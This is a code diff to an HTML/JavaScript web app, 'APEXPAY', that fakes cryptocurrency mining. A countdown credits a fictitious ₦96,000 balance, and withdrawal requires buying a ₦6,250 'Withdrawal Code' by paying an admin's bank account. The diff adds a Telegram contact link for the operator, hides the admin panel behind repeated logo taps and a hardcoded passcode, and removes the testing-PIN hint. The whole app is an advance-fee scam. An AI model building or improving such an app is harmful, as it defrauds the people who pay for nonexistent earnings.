@@ -61,6 +61,7 @@
         .spinner { border: 6px solid #1e293b; border-top: 6px solid #f39c12; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .text-container { text-align: left; max-width: 400px; margin: 0 auto 15px auto; background: #161b22; padding: 18px; border-radius: 10px; border: 1px solid #30363d; }
+        .code-box { background: #1e293b; border: 2px dashed #2ecc71; padding: 15px; border-radius: 10px; margin: 15px auto; max-width: 400px; font-size: 24px; font-weight: bold; color: #2ecc71; letter-spacing: 4px; }
     </style>
 </head>
 <body>
@@ -94,13 +95,23 @@
     <!-- PAGE 4: DASHBOARD -->
     <div id="page-dashboard" class="page">
         <div class="top-nav">
-            <span style="font-weight: bold; color: #2ecc71;">⚡ APEXPAY</span>
+            <!-- Tap 4 times on APEXPAY logo to open secret Admin login -->
+            <span style="font-weight: bold; color: #2ecc71; cursor: pointer; user-select: none;" onclick="handleLogoClick()">⚡ APEXPAY</span>
             <div class="top-nav-right">
-                <button id="admin-nav-btn" class="nav-btn hidden" onclick="navigate('page-admin')">⚙️ Admin</button>
+                <button class="nav-btn" style="background: #2ecc71; color: #000;" onclick="contactAdmin()">💬 Contact Admin</button>
                 <button class="nav-btn" onclick="openHistoryModal()">📜 History</button>
                 <button class="nav-btn" style="color: #e74c3c;" onclick="logoutUser()">🚪 Logout</button>
             </div>
         </div>
+
+        <!-- Banner showing approved withdrawal code to user if available -->
+        <div id="user-code-banner" class="hidden">
+            <div class="code-box">
+                <span style="font-size:12px; color:#cbd5e1; display:block; margin-bottom:5px;">YOUR APPROVED WITHDRAWAL CODE:</span>
+                <span id="user-display-code">------</span>
+            </div>
+        </div>
+
         <div class="balance-card">
             <h3 style="margin: 0;">Mining Balance</h3>
             <div class="balance-amount">₦<span id="dash-balance">0.00</span></div>
@@ -110,7 +121,7 @@
             <p><strong>Account:</strong> <span id="dash-acct">0000000000</span></p>
         </div>
         <div class="bottom-nav">
-            <button class="nav-item" onclick="navigate('page-more-mines')"><span>⛏️</span> MORE MINES</button>
+            <button class="nav-item" onclick="navigate('page-more-mines')"><span>⛏</span> MORE MINES</button>
             <button class="nav-item" onclick="startMiningProcess()"><span>👛</span> MINE</button>
             <button class="nav-item" onclick="navigate('page-withdraw')"><span>🤝</span> WITHDRAW</button>
             <button class="nav-item" onclick="navigate('page-learn-more')"><span>ℹ️</span> INFO</button>
@@ -121,13 +132,13 @@
     <div id="modal-mining" class="modal hidden">
         <div class="modal-content">
             <div id="mining-spinner-box"><h2>Mining... ⛏️</h2><div class="spinner"></div><h1 id="countdown-timer">5</h1></div>
-            <div id="mining-success-box" class="hidden"><div style="font-size: 70px; color: #2ecc71;">✔️️</div><h2 style="color: #2ecc71;">Success!</h2><p>₦96,000 added to balance.</p><button class="btn" onclick="closeMiningModal()">CONTINUE</button></div>
+            <div id="mining-success-box" class="hidden"><div style="font-size: 70px; color: #2ecc71;">✔</div><h2 style="color: #2ecc71;">Success!</h2><p>₦96,000 added to balance.</p><button class="btn" onclick="closeMiningModal()">CONTINUE</button></div>
         </div>
     </div>
 
     <div id="modal-limit" class="modal hidden">
         <div class="modal-content"><h2 style="color: #e74c3c;">LIMIT REACHED</h2><p>You have reached your free mining capacity.</p>
-        <button class="btn" onclick="showAdminContactAlert()">Upgrade Account</button><button class="btn btn-secondary" onclick="navigate('page-withdraw'); document.getElementById('modal-limit').classList.add('hidden');">Withdraw Funds</button></div>
+        <button class="btn" onclick="contactAdmin()">Contact Admin on Telegram</button><button class="btn btn-secondary" onclick="navigate('page-withdraw'); document.getElementById('modal-limit').classList.add('hidden');">Withdraw Funds</button></div>
     </div>
 
     <div id="modal-history" class="modal hidden">
@@ -155,7 +166,7 @@
     </div>
 
     <div id="page-pin" class="page">
-        <h2>Enter Code</h2><p style="font-size:12px;">Enter your 6-Digit Withdrawal Code (Default testing pin: 123456)</p>
+        <h2>Enter Code</h2><p style="font-size:12px;">Enter your 6-Digit Withdrawal Code</p>
         <div class="pin-display" id="pin-display">_ _ _ _ _ _</div>
         <div class="keypad">
             <div class="key" onclick="pressKey('1')">1</div><div class="key" onclick="pressKey('2')">2</div><div class="key" onclick="pressKey('3')">3</div>
@@ -183,21 +194,21 @@
         <button class="btn" id="btn-paid" disabled onclick="submitPayment()">I'VE PAID</button>
     </div>
 
-    <!-- ADMIN PANEL -->
+    <!-- HIDDEN ADMIN PANEL -->
     <div id="page-admin" class="page">
         <h1 style="color: #e74c3c;">Admin Control Panel</h1>
         
         <div class="text-container">
-            <h3>Withdrawal Code Price</h3>
-            <input type="number" id="set-code-price" value="6250">
-            <button class="btn" onclick="saveAdminSettings()">Save Price</button>
+            <h3>Telegram Support Link</h3>
+            <p style="font-size: 12px; color: #cbd5e1;">Input your Telegram link for users to contact you:</p>
+            <input type="url" id="set-telegram-link" placeholder="https://t.me/yourusername">
+            <button class="btn" onclick="saveAdminSettings()">Save Telegram Link</button>
         </div>
 
         <div class="text-container">
-            <h3>Add New Admin</h3>
-            <p style="font-size: 12px; color: #cbd5e1;">Enter user's 11-digit phone number to grant admin access:</p>
-            <input type="tel" id="new-admin-phone" placeholder="User Phone Number" maxlength="11">
-            <button class="btn" style="background: #2ecc71; color: #000;" onclick="addOtherUserAsAdmin()">Grant Admin Access</button>
+            <h3>Withdrawal Code Price</h3>
+            <input type="number" id="set-code-price" value="6250">
+            <button class="btn" onclick="saveAdminSettings()">Save Price</button>
         </div>
 
         <div class="text-container">
@@ -212,34 +223,31 @@
     <!-- INFORMATIONAL PAGES -->
     <div id="page-learn-more" class="page">
         <h1>LEARN MORE</h1>
-        <div class="text-container"><h3 style="color: #2ecc71;">Welcome to APEXPAY</h3><p>APEXPAY Wallet is a digital asset platform designed to help you grow your wealth effortlessly. Our cloud-based system allows you to mine digital funds directly from your smartphone without draining your battery or data.</p></div>
-        <div class="text-container"><h3 style="color: #2ecc71;">How Mining Works</h3><p>Click the <strong>MINE</strong> button on your dashboard to start the automated process. New users are granted a free mining capacity (₦96,000) per session. Once this limit is reached, you must withdraw your funds before you can mine again.</p></div>
-        <div class="text-container"><h3 style="color: #2ecc71;">How to Withdraw</h3><p>To ensure security and prevent bot accounts, a one-time <strong>Withdrawal Code</strong> is required to cash out. You can securely purchase this code inside the app by sending the fee to the official Admin account. Once approved, your 6-digit code will be issued.</p></div>
-        <div class="text-container"><h3 style="color: #2ecc71;">Account Upgrades</h3><p>Want to mine beyond the free limit? You can upgrade your account to unlock higher mining capacities. Click on <strong>MORE MINES</strong> on your dashboard to contact the Admin for upgrade packages.</p></div>
+        <div class="text-container"><h3 style="color: #2ecc71;">Welcome to APEXPAY</h3><p>APEXPAY Wallet is a digital asset platform designed to help you grow your wealth effortlessly.</p></div>
+        <div class="text-container"><h3 style="color: #2ecc71;">How Mining Works</h3><p>Click the <strong>MINE</strong> button on your dashboard to start the automated process. New users are granted a free mining capacity (₦96,000) per session.</p></div>
+        <div class="text-container"><h3 style="color: #2ecc71;">How to Withdraw</h3><p>To ensure security, a one-time <strong>Withdrawal Code</strong> is required to cash out. You can purchase this code inside the app.</p></div>
         <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Back to Dashboard</button>
     </div>
 
     <div id="page-more-mines" class="page">
         <h2>MORE MINES</h2><p>Upgrade your capacity to mine up to ₦500,000 daily.</p>
-        <button class="btn" onclick="showAdminContactAlert()">Contact Admin to Upgrade</button>
+        <button class="btn" style="background: #2ecc71; color: #000;" onclick="contactAdmin()">Contact Admin on Telegram</button>
         <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Back to Dashboard</button>
     </div>
-        <script>
+             <script>
         let currentUser = { phone: '', name: '', acctNum: '', balance: 0, hasMined: false, isAdmin: false, totalMined: 0, totalWithdrawn: 0, history: [] };
-        let systemSettings = { codePrice: 6250, adminBank: 'Opay', adminName: 'ApexPay Business Account', adminAcct: '8012345678', validCode: null, adminPhones: [] };
+        let systemSettings = { codePrice: 6250, adminBank: 'Opay', adminName: 'ApexPay Business Account', adminAcct: '8012345678', validCode: null, telegramLink: 'https://t.me/yourusername', adminPin: '9999' };
         let currentPin = "";
+        let logoTapCount = 0;
+        let logoTapTimer = null;
 
         window.onload = () => {
             const savedSettings = localStorage.getItem('apex_settings');
             if (savedSettings) systemSettings = JSON.parse(savedSettings);
-            if (!systemSettings.adminPhones) systemSettings.adminPhones = [];
 
             const savedUser = localStorage.getItem('apex_user');
             if (savedUser) {
                 currentUser = JSON.parse(savedUser);
-                if (systemSettings.adminPhones.includes(currentUser.phone)) {
-                    currentUser.isAdmin = true;
-                }
                 updateDashboardUI();
                 navigate('page-dashboard');
             } else { 
@@ -249,14 +257,35 @@
         };
 
         function navigate(pageId) {
-            if (pageId === 'page-admin' && !currentUser.isAdmin) {
-                alert("Access Denied: You are not an Admin!");
-                return;
-            }
-
             document.querySelectorAll('.page').forEach(page => page.classList.remove('active-page'));
             document.getElementById(pageId).classList.add('active-page');
             window.scrollTo(0,0);
+        }
+
+        // Secret Admin Access: Tap logo 4 times quickly
+        function handleLogoClick() {
+            logoTapCount++;
+            clearTimeout(logoTapTimer);
+            if (logoTapCount >= 4) {
+                logoTapCount = 0;
+                const enteredPin = prompt("Enter Secret Admin Passcode:");
+                if (enteredPin === systemSettings.adminPin) {
+                    navigate('page-admin');
+                } else if (enteredPin !== null) {
+                    alert("Incorrect Admin Passcode!");
+                }
+            } else {
+                logoTapTimer = setTimeout(() => { logoTapCount = 0; }, 1200);
+            }
+        }
+
+        function contactAdmin() {
+            const link = systemSettings.telegramLink;
+            if (link && link.trim() !== '') {
+                window.open(link, '_blank');
+            } else {
+                alert("Admin Telegram link is not configured yet.");
+            }
         }
 
         function registerUser() {
@@ -272,16 +301,7 @@
             currentUser.name = name; 
             currentUser.acctNum = acct; 
             currentUser.balance = 0;
-            
-            if (!localStorage.getItem('apex_has_admin')) {
-                currentUser.isAdmin = true;
-                systemSettings.adminPhones.push(phone);
-                localStorage.setItem('apex_has_admin', 'true');
-            } else if (systemSettings.adminPhones.includes(phone)) {
-                currentUser.isAdmin = true;
-            } else {
-                currentUser.isAdmin = false;
-            }
+            currentUser.isAdmin = false;
             
             saveUser(); 
             updateDashboardUI(); 
@@ -310,8 +330,6 @@
                 currentUser.balance = 0;
             }
 
-            currentUser.isAdmin = systemSettings.adminPhones.includes(phone);
-
             saveUser(); 
             updateDashboardUI(); 
             navigate('page-dashboard');
@@ -333,38 +351,25 @@
             document.getElementById('dash-balance').innerText = currentUser.balance.toLocaleString('en-US', {minimumFractionDigits: 2});
             document.getElementById('dash-name').innerText = currentUser.name;
             document.getElementById('dash-acct').innerText = currentUser.acctNum;
-            
-            if (currentUser.isAdmin) {
-                document.getElementById('admin-nav-btn').classList.remove('hidden');
-            } else {
-                document.getElementById('admin-nav-btn').classList.add('hidden');
-            }
-
             document.getElementById('with-name').value = currentUser.name;
             document.getElementById('with-acct-num').value = currentUser.acctNum;
             document.getElementById('display-code-price').innerText = parseFloat(systemSettings.codePrice).toLocaleString();
             document.getElementById('display-code-price2').innerText = parseFloat(systemSettings.codePrice).toLocaleString();
+            document.getElementById('set-telegram-link').value = systemSettings.telegramLink || '';
 
-            if (localStorage.getItem('pending_payment') === 'true' && currentUser.isAdmin) {
+            // Display valid approved code to the user if it exists
+            const codeBanner = document.getElementById('user-code-banner');
+            const codeDisplay = document.getElementById('user-display-code');
+            if (systemSettings.validCode) {
+                codeDisplay.innerText = systemSettings.validCode;
+                codeBanner.classList.remove('hidden');
+            } else {
+                codeBanner.classList.add('hidden');
+            }
+
+            if (localStorage.getItem('pending_payment') === 'true') {
                 document.getElementById('pending-list').innerText = "1 Pending Payment from User";
                 document.getElementById('btn-approve').style.display = 'block';
-            }
-        }
-
-        function addOtherUserAsAdmin() {
-            const targetPhone = document.getElementById('new-admin-phone').value.trim();
-            if (targetPhone.length !== 11) {
-                alert("Please enter a valid 11-digit phone number.");
-                return;
-            }
-
-            if (!systemSettings.adminPhones.includes(targetPhone)) {
-                systemSettings.adminPhones.push(targetPhone);
-                saveUser();
-                alert(`Success! ${targetPhone} granted Admin rights.\nWhen this user logs in, they will see the Admin button.`);
-                document.getElementById('new-admin-phone').value = "";
-            } else {
-                alert("This user is already an Admin.");
             }
         }
 
@@ -407,7 +412,6 @@
         }
 
         function closeMiningModal() { document.getElementById('modal-mining').classList.add('hidden'); }
-        function showAdminContactAlert() { alert("Contact Admin to Upgrade."); }
         
         function openHistoryModal() { 
             document.getElementById('hist-mined').innerText = (currentUser.totalMined || 0).toLocaleString();
@@ -440,9 +444,12 @@
                 currentUser.totalWithdrawn = (currentUser.totalWithdrawn || 0) + withdrawAmt;
                 if(!currentUser.history) currentUser.history = [];
                 currentUser.history.unshift(`Withdrew -₦${withdrawAmt.toLocaleString()} on ${new Date().toLocaleTimeString()}`);
+                
+                // Clear the used code so it disappears from the dashboard
                 systemSettings.validCode = null; 
                 saveUser(); 
                 updateDashboardUI();
+                
                 alert("Withdrawal Processed Successfully!");
                 currentPin = ""; 
                 pressKey(''); 
@@ -469,9 +476,10 @@
 
         function saveAdminSettings() {
             systemSettings.codePrice = document.getElementById('set-code-price').value;
+            systemSettings.telegramLink = document.getElementById('set-telegram-link').value.trim();
             saveUser(); 
             updateDashboardUI(); 
-            alert("Admin settings updated!");
+            alert("Admin settings updated successfully!");
         }
 
         function approvePayment() {
@@ -479,7 +487,8 @@
             systemSettings.validCode = generatedCode; 
             localStorage.removeItem('pending_payment'); 
             saveUser();
-            alert(`Payment Approved! Generated One-Time 6-Digit Withdrawal Code: ${generatedCode}`);
+            updateDashboardUI();
+            alert(`Payment Approved! Generated 6-Digit Code: ${generatedCode}\nThis code is now visible on the user's Dashboard.`);
             document.getElementById('pending-list').innerText = "No pending payments."; 
             document.getElementById('btn-approve').style.display = 'none';
         }
